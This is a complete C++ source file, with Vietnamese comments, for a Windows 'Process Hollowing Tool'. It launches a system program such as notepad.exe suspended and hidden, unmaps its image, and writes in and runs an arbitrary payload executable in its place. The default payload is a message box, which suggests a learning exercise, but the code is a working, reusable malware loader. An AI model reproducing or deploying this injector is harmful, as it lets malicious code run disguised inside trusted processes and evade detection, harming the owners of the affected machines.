#include <Windows.h>

#include <fstream>
#include <iostream>
#include <string>

// Hàm log lỗi chi tiết
void LogError(const char* context) {
  DWORD error = GetLastError();
  char buffer[256] = {0};
  FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, buffer,
                 sizeof(buffer), NULL);

  std::cout << "[ERROR] " << context << ": (" << std::hex << error << ") "
            << buffer << std::dec << std::endl;

  // Ghi log ra file
  std::ofstream logFile("hollowing_error.log", std::ios::app);
  if (logFile.is_open()) {
    logFile << "[" << context << "] Error 0x" << std::hex << error << ": "
            << buffer << std::dec << std::endl;
    logFile.close();
  }
}

// Kiểm tra và chuẩn bị dữ liệu PE
bool ValidatePE(BYTE* data, SIZE_T size) {
  if (size < sizeof(IMAGE_DOS_HEADER)) return false;

  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)data;
  if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return false;

  if (size < dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)) return false;

  PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(data + dosHeader->e_lfanew);
  if (ntHeader->Signature != IMAGE_NT_SIGNATURE) return false;

  return true;
}

bool ProcessHollowing(const char* targetPath, const char* payloadPath) {
  std::cout << "[+] Start Process Hollowing" << std::endl;
  std::cout << "[+] Target: " << targetPath << std::endl;
  std::cout << "[+] Payload: " << payloadPath << std::endl;

  // 1. Đọc file payload
  HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    LogError("CreateFile payload");
    return false;
  }

  DWORD fileSize = GetFileSize(hFile, NULL);
  BYTE* payloadData = new BYTE[fileSize];
  SIZE_T bytesRead = 0;

  if (!ReadFile(hFile, payloadData, fileSize, (LPDWORD)&bytesRead, NULL)) {
    LogError("ReadFile payload");
    CloseHandle(hFile);
    delete[] payloadData;
    return false;
  }

  CloseHandle(hFile);

  // 2. Kiểm tra tính hợp lệ của PE
  if (!ValidatePE(payloadData, fileSize)) {
    std::cout << "[!] payload file invalidate" << std::endl;
    delete[] payloadData;
    return false;
  }

  // 3. Phân tích headers
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadData;
  PIMAGE_NT_HEADERS ntHeader =
      (PIMAGE_NT_HEADERS)(payloadData + dosHeader->e_lfanew);

  DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
  DWORD imageSize = ntHeader->OptionalHeader.SizeOfImage;

  std::cout << "[+] PE Entry Point: 0x" << std::hex << entryPointRVA << std::dec
            << std::endl;
  std::cout << "[+] PE Image Size: 0x" << std::hex << imageSize << std::dec
            << std::endl;

  // 4. Tạo tiến trình đích
  STARTUPINFOA si = {sizeof(STARTUPINFOA)};
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;  // Ẩn cửa sổ

  PROCESS_INFORMATION pi;

  DWORD creationFlags = CREATE_SUSPENDED | CREATE_NO_WINDOW;

  if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, creationFlags, NULL,
                      NULL, &si, &pi)) {
    LogError("CreateProcess");
    delete[] payloadData;
    return false;
  }

  std::cout << "[+] Created suspended process (PID: " << pi.dwProcessId << ")"
            << std::endl;

  // 5. Lấy thông tin tiến trình
  CONTEXT context = {0};
  context.ContextFlags = CONTEXT_FULL;

  if (!GetThreadContext(pi.hThread, &context)) {
    LogError("GetThreadContext");
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    delete[] payloadData;
    return false;
  }

// 6. Xác định PEB location và đọc ImageBase
#ifdef _WIN64
  DWORD64 pebAddress = context.Rdx;
#else
  DWORD pebAddress = context.Ebx;
#endif

  LPVOID imageBase = NULL;
  bytesRead = 0;  // Sử dụng lại biến bytesRead đã khai báo trước đó

#ifdef _WIN64
  if (!ReadProcessMemory(pi.hProcess, (LPVOID)(pebAddress + 0x10), &imageBase,
                         sizeof(LPVOID), &bytesRead)) {
#else
  if (!ReadProcessMemory(pi.hProcess, (LPVOID)(pebAddress + 0x8), &imageBase,
                         sizeof(LPVOID), &bytesRead)) {
#endif
    LogError("ReadProcessMemory ImageBase");
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    delete[] payloadData;
    return false;
  }

  std::cout << "[+] Target ImageBase: 0x" << std::hex << (ULONG_PTR)imageBase
            << std::dec << std::endl;

  // 7. Giải phóng vùng nhớ gốc
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  if (!ntdll) {
    LogError("GetModuleHandle ntdll");
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    delete[] payloadData;
    return false;
  }

  typedef NTSTATUS(NTAPI * pNtUnmapViewOfSection)(HANDLE, PVOID);
  pNtUnmapViewOfSection NtUnmapViewOfSection =
      (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

  if (!NtUnmapViewOfSection) {
    LogError("GetProcAddress NtUnmapViewOfSection");
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    delete[] payloadData;
    return false;
  }

  NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, imageBase);
  std::cout << "[*] NtUnmapViewOfSection status: 0x" << std::hex << status
            << std::dec << std::endl;

  // 8. Cấp phát vùng nhớ mới
  LPVOID newBase = VirtualAllocEx(pi.hProcess,
                                  imageBase,  // Ưu tiên cùng địa chỉ
                                  imageSize, MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);

  if (!newBase) {
    // Thử cấp phát ở địa chỉ khác
    newBase = VirtualAllocEx(pi.hProcess, NULL, imageSize,
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!newBase) {
      LogError("VirtualAllocEx");
      TerminateProcess(pi.hProcess, 1);
      CloseHandle(pi.hThread);
      CloseHandle(pi.hProcess);
      delete[] payloadData;
      return false;
    }
  }

  std::cout << "[+] Allocated memory at: 0x" << std::hex << (ULONG_PTR)newBase
            << std::dec << std::endl;

  // 9. Ghi PE headers
  if (!WriteProcessMemory(pi.hProcess, newBase, payloadData,
                          ntHeader->OptionalHeader.SizeOfHeaders, NULL)) {
    LogError("WriteProcessMemory Headers");
    VirtualFreeEx(pi.hProcess, newBase, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    delete[] payloadData;
    return false;
  }

  // 10. Ghi từng section với kiểm tra từng cái
  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);

  for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
    // Bỏ qua section không hợp lệ
    if (section[i].SizeOfRawData == 0 || section[i].PointerToRawData == 0 ||
        section[i].PointerToRawData + section[i].SizeOfRawData > fileSize) {
      char sectionName[9] = {0};
      memcpy(sectionName, section[i].Name, 8);
      std::cout << "[!] Skip section invalidate: " << sectionName << std::endl;
      continue;
    }

    LPVOID sectionDest =
        (LPVOID)((ULONG_PTR)newBase + section[i].VirtualAddress);
    LPVOID sectionSource = (LPVOID)(payloadData + section[i].PointerToRawData);

    // Ghi section
    if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSource,
                            section[i].SizeOfRawData, NULL)) {
      char sectionName[9] = {0};
      memcpy(sectionName, section[i].Name, 8);
      std::cout << "[!] write section error " << sectionName << std::endl;
      LogError("WriteProcessMemory Section");

      // Vẫn tiếp tục với section khác
    } else {
      char sectionName[9] = {0};
      memcpy(sectionName, section[i].Name, 8);
      std::cout << "[+] write section " << sectionName << std::endl;
    }
  }

  // 11. Đặt quyền bảo vệ cho từng section
  section = IMAGE_FIRST_SECTION(ntHeader);
  for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
    if (section[i].SizeOfRawData == 0) continue;

    LPVOID sectionDest =
        (LPVOID)((ULONG_PTR)newBase + section[i].VirtualAddress);
    DWORD oldProtect, protect = PAGE_READONLY;

    // Xác định quyền bảo vệ
    if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
      if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE)
        protect = PAGE_EXECUTE_READWRITE;
      else
        protect = PAGE_EXECUTE_READ;
    } else if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
      protect = PAGE_READWRITE;
    }

    if (!VirtualProtectEx(pi.hProcess, sectionDest, section[i].SizeOfRawData,
                          protect, &oldProtect)) {
      char sectionName[9] = {0};
      memcpy(sectionName, section[i].Name, 8);
      std::cout << "[!] Failed to set protection for section " << sectionName
                << std::endl;
      // Tiếp tục
    }
  }

  // 12. Cập nhật ImageBase trong PEB nếu cần
  if (imageBase != newBase) {
#ifdef _WIN64
    if (!WriteProcessMemory(pi.hProcess, (LPVOID)(pebAddress + 0x10), &newBase,
                            sizeof(LPVOID), NULL)) {
#else
    if (!WriteProcessMemory(pi.hProcess, (LPVOID)(pebAddress + 0x8), &newBase,
                            sizeof(LPVOID), NULL)) {
#endif
      LogError("WriteProcessMemory PEB ImageBase");
      // Vẫn tiếp tục...
    }
  }

// 13. Cập nhật Entry Point trong thread context
#ifdef _WIN64
  context.Rcx = (ULONG_PTR)newBase + entryPointRVA;
#else
  context.Eax = (ULONG_PTR)newBase + entryPointRVA;
#endif

  if (!SetThreadContext(pi.hThread, &context)) {
    LogError("SetThreadContext");
    VirtualFreeEx(pi.hProcess, newBase, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    delete[] payloadData;
    return false;
  }

  std::cout << "[+] Updated thread context with entry point: 0x" << std::hex
            << ((ULONG_PTR)newBase + entryPointRVA) << std::dec << std::endl;

  // 14. Resume thread
  if (ResumeThread(pi.hThread) == (DWORD)-1) {
    LogError("ResumeThread");
    VirtualFreeEx(pi.hProcess, newBase, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    delete[] payloadData;
    return false;
  }

  std::cout << "[+] Successfully resumed the thread!" << std::endl;

  // Dọn dẹp
  delete[] payloadData;
  CloseHandle(pi.hThread);
  CloseHandle(pi.hProcess);

  return true;
}

int main(int argc, char* argv[]) {
  const char* targetPath = "C:\\Windows\\System32\\notepad.exe";
  //   const char* targetPath = "C:\\Windows\\System32\\calc.exe"; Calculator
  //   const char* targetPath = "C:\\Windows\\System32\\write.exe";     WordPad
  //   const char* targetPath = "C:\\Windows\\System32\\mspaint.exe";   Paint

  // Đường dẫn payload mặc định cùng thư mục với file thực thi
  char exePath[MAX_PATH] = {0};
  GetModuleFileNameA(NULL, exePath, MAX_PATH);

  std::string exeDir = exePath;
  size_t pos = exeDir.find_last_of("\\/");
  if (pos != std::string::npos) {
    exeDir = exeDir.substr(0, pos + 1);
  } else {
    exeDir = "";
  }

  std::string payloadFullPath = exeDir + "messagebox.exe";
  const char* payloadPath = payloadFullPath.c_str();

  if (argc >= 2) targetPath = argv[1];
  if (argc >= 3) payloadPath = argv[2];

  std::cout << "=======================================" << std::endl;
  std::cout << "        Process Hollowing Tool         " << std::endl;
  std::cout << "=======================================" << std::endl;

  if (ProcessHollowing(targetPath, payloadPath)) {
    std::cout << "\n[SUCCESS] Process hollowing completed!" << std::endl;
    return 0;
  } else {
    std::cout << "\n[FAILURE] Process hollowing failed!" << std::endl;
    return 1;
  }
}